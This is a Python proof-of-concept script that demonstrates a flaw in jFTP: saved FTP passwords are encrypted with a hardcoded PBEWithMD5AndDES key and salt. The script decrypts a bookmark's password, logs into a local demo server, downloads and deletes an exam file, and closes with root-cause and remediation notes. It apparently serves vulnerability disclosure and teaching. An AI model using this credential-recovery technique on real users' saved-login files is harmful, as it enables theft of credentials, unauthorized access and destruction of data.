#!/usr/bin/env python3
"""
Simulated attack: recover an FTP password from a jFTP bookmark/login file
by exploiting jFTP's hardcoded PBEWithMD5AndDES key/salt in Crypto.java,
then use the recovered credentials to download and delete a "sensitive"
exam file from a pyftpdlib FTP server that otherwise requires auth.

This only ever talks to the local demo server started by this script
(127.0.0.1:2121) and only ever decrypts a ciphertext this script itself
produced moments earlier with jFTP's own (unmodified) Crypto class.

Cross-platform by design (no shell-outs other than javac/java, no
hardcoded path separators): tested to run the same way via

    python attack.py          # Windows cmd.exe / PowerShell
    python3 attack.py         # macOS / Linux

Prerequisites: a JDK (for javac/java) on PATH or $JAVA_HOME, and either
Python 3.10/3.11 or the `pyasynchat`/`pyasyncore` backport packages
installed (pyftpdlib imports the stdlib asyncore/asynchat modules, which
were removed in Python 3.12). Run `setup.py` first if you haven't -- it
checks/reports on both of these and compiles the Java helper.
"""
from __future__ import annotations

import os
import socket
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from common import DEMO_DIR, classpath, find_java_tool, jftp_src  # noqa: E402

SERVER_ROOT = DEMO_DIR / "server_root"
FIXTURE_EXAM = DEMO_DIR / "fixtures" / "exam.txt"
BOOKMARK_FILE = DEMO_DIR / "jftp_config" / ".login_default"
ATTACKER_DIR = DEMO_DIR / "attacker_workspace"
LOG_DIR = DEMO_DIR / "logs"
LOG_FILE = LOG_DIR / "server.log"
CRYPTO_OUT = DEMO_DIR / "crypto_helper" / "out"

HOST = "127.0.0.1"
PORT = 2121

# The real FTP account password, as chosen by the ("victim") exam
# administrator. The attacker does NOT know this value in advance -- it is
# only ever referenced here to (a) start the server and (b) let the victim
# side "save" it into a jFTP bookmark, exactly as jFTP's save-password
# feature would. From here on, the attacker path only ever uses the
# ENCRYPTED copy recovered from the bookmark file.
VICTIM_PASSWORD = "Fa!!2026_ExamDrop9"
VICTIM_USER = "ta_exams"


def section(title: str) -> None:
    print(f"\n=== {title} ===")


def wait_for_port(host: str, port: int, timeout: float = 5.0) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.25)
    return False


def run_crypto_cli(mode: str, value: str) -> str:
    java = find_java_tool("java")
    cp = classpath(CRYPTO_OUT, jftp_src() / "lib")
    result = subprocess.run(
        [java, "-cp", cp, "CryptoCli", mode, value],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        raise SystemExit(
            f"CryptoCli {mode} failed (exit {result.returncode}):\n{result.stderr}"
        )
    return result.stdout.strip()


def ensure_crypto_compiled() -> None:
    marker = CRYPTO_OUT / "CryptoCli.class"
    if marker.is_file():
        return
    print("[attack] crypto_helper not compiled yet -- running setup.py first...")
    setup_script = DEMO_DIR / "setup.py"
    subprocess.run([sys.executable, str(setup_script)], check=True)


def main() -> int:
    import ftplib

    ensure_crypto_compiled()

    SERVER_ROOT.mkdir(parents=True, exist_ok=True)
    (DEMO_DIR / "jftp_config").mkdir(parents=True, exist_ok=True)
    ATTACKER_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)

    section("0. Reset demo state")
    exam_path = SERVER_ROOT / "exam.txt"
    if not exam_path.is_file():
        exam_path.write_bytes(FIXTURE_EXAM.read_bytes())
    stolen_copy = ATTACKER_DIR / "exam.txt"
    if stolen_copy.exists():
        stolen_copy.unlink()
    print("server_root contents:", [p.name for p in SERVER_ROOT.iterdir()])

    section("1. Start the FTP server (one account, no anonymous access)")
    log_fh = open(LOG_FILE, "w", encoding="utf-8")
    server_proc = subprocess.Popen(
        [
            sys.executable,
            str(DEMO_DIR / "server.py"),
            "--root", str(SERVER_ROOT),
            "--user", VICTIM_USER,
            "--password", VICTIM_PASSWORD,
            "--host", HOST,
            "--port", str(PORT),
        ],
        stdout=log_fh,
        stderr=subprocess.STDOUT,
    )
    try:
        if not wait_for_port(HOST, PORT, timeout=10):
            log_fh.flush()
            print(LOG_FILE.read_text(encoding="utf-8", errors="replace"))
            raise SystemExit("server did not come up on time")
        print(f"server started, pid={server_proc.pid}")

        section("2. Baseline: confirm the exam is NOT reachable without credentials")
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=5)
        try:
            ftp.login()  # anonymous
            print("[baseline] UNEXPECTED: anonymous login succeeded")
            ftp.quit()
            raise SystemExit("server misconfigured: anonymous access allowed")
        except ftplib.error_perm as err:
            print(f"[baseline] anonymous login rejected as expected: {err}")
            ftp.close()

        section(
            "3. Victim side: TA saves the FTP login in jFTP "
            "(bookmark file written to disk)"
        )
        encrypted_pw = run_crypto_cli("encrypt", VICTIM_PASSWORD)
        # Real SaveSet 6-line format: host / user / encrypted-pass / port / cwd / lcwd
        bookmark_lines = [HOST, VICTIM_USER, encrypted_pw, str(PORT), "/", "/home/ta/exams"]
        BOOKMARK_FILE.write_text("\n".join(bookmark_lines) + "\n", encoding="utf-8")
        print(f"wrote {BOOKMARK_FILE}:")
        print(BOOKMARK_FILE.read_text(encoding="utf-8"))
        print(
            "(this is the kind of file that ends up in backups, shared lab\n"
            "accounts, synced dotfiles, etc. -- the attacker's starting point\n"
            "is just read access to this file, NOT the real FTP password.)"
        )

        section("4. Attacker side: recover the password from the bookmark file")
        lines = BOOKMARK_FILE.read_text(encoding="utf-8").splitlines()
        bm_host, bm_user, bm_enc_pw, bm_port = lines[0], lines[1], lines[2], lines[3]
        print(f"  host={bm_host} user={bm_user} port={bm_port}")
        print(f"  stored (encrypted) password field: {bm_enc_pw}")
        print()
        print(
            "jFTP 'encrypts' saved passwords with PBEWithMD5AndDES using a\n"
            "password and salt that are hardcoded constants in Crypto.java --\n"
            "identical on every install, and visible to anyone with the jFTP\n"
            "source or jar. The attacker recompiles/reuses that exact class\n"
            "to decrypt:"
        )
        recovered_pw = run_crypto_cli("decrypt", bm_enc_pw)
        print(f"  recovered plaintext password: {recovered_pw}")

        if recovered_pw != VICTIM_PASSWORD:
            raise SystemExit(
                "recovery FAILED (recovered value does not match victim password)"
            )
        print("  -> matches the real FTP account password.")

        section(
            "5. Exploit: log in with recovered credentials, download + delete exam.txt"
        )
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=5)
        ftp.login(user=bm_user, passwd=recovered_pw)
        print("[exploit] login succeeded with recovered credentials")
        print(f"[exploit] directory listing: {ftp.nlst()}")
        with open(stolen_copy, "wb") as f:
            print(f"[exploit] downloading exam.txt -> {stolen_copy}")
            ftp.retrbinary("RETR exam.txt", f.write)
        print("[exploit] deleting exam.txt from the server")
        ftp.delete("exam.txt")
        print(f"[exploit] directory listing after delete: {ftp.nlst()}")
        ftp.quit()

        section("6. Impact")
        print("server_root now contains:", [p.name for p in SERVER_ROOT.iterdir()])
        print(
            "attacker_workspace now contains:",
            [p.name for p in ATTACKER_DIR.iterdir()],
        )
        if stolen_copy.is_file():
            print("\nattacker's local copy of the exfiltrated exam:")
            print(stolen_copy.read_text(encoding="utf-8"))

        if exam_path.is_file():
            raise SystemExit("FAILED: exam.txt still present on the server")

        section("7. Server log (for reference)")
        log_fh.flush()
        print(LOG_FILE.read_text(encoding="utf-8", errors="replace"))

        section("Summary")
        print(SUMMARY)
        return 0
    finally:
        log_fh.close()
        if server_proc.poll() is None:
            server_proc.terminate()
            try:
                server_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                server_proc.kill()
                server_proc.wait()


SUMMARY = """\
Root cause: net.sf.jftp.config.Crypto uses a hardcoded password and salt
(PBEWithMD5AndDES) to obscure saved FTP passwords. This is reversible
encryption with a key that is identical for every user and every install,
and is public (it ships in the open-source jar/class files). Anyone who can
read a user's saved-login file (bookmarks.txt / .login_default) can recover
the real FTP password without brute-forcing, sniffing traffic, or touching
the server at all -- "storing" the password this way is only cosmetically
different from storing it in plaintext.

This defeats the server-side control entirely: the FTP server itself was
configured correctly (no anonymous access, a single account scoped to its
own directory), but the secrecy of that account's password was the only
thing standing between "accessor" and the exam file, and that secrecy was
never real.

Remediations to point out in a writeup:
  - Never encrypt/obfuscate locally stored secrets with a key that is
    hardcoded in source/bytecode shipped to every user (CWE-321 / CWE-798).
  - Use OS-provided secret storage (keychain/credential manager/DPAPI) or a
    per-install, randomly generated key never written to disk in the clear.
  - Don't rely on a single long-lived shared credential for something as
    sensitive as exam distribution; use short-lived, per-user credentials
    or tokens and rotate/revoke them.
  - Treat "encrypted at rest with a static key" as equivalent to plaintext
    for threat-modeling purposes.
"""


if __name__ == "__main__":
    sys.exit(main())
